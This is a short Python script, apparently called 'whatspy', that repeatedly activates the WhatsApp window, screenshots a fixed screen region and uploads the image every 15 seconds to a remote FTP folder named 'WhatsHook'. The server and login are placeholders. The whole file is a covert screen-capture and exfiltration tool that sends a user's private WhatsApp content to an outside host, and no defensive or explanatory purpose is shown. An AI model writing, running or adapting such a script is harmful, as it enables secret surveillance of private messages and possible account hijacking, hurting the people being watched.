import pyscreenshot as ImageGrab
import ftplib
import pygetwindow as gw
from time import sleep

while True:
    win = gw.getWindowsWithTitle('WhatsApp')[0]
    win.activate()

    # part of the screen
    im=ImageGrab.grab(bbox=(1136,225,1400,488))

    # to file 
    session = ftplib.FTP('SERVER DOMAIN','LOGINNAME','LOGINPASSWORD')
    im.save("C:/Users/YOUR DIRECTORY/whatspy/img.png")
    file = open("C:/Users/YOUR DIRECTORY/whatspy/img.png",'rb')
    session.cwd("WhatsHook")
    session.storbinary('STOR img.png', file)
    file.close()
    session.quit()
    sleep(15)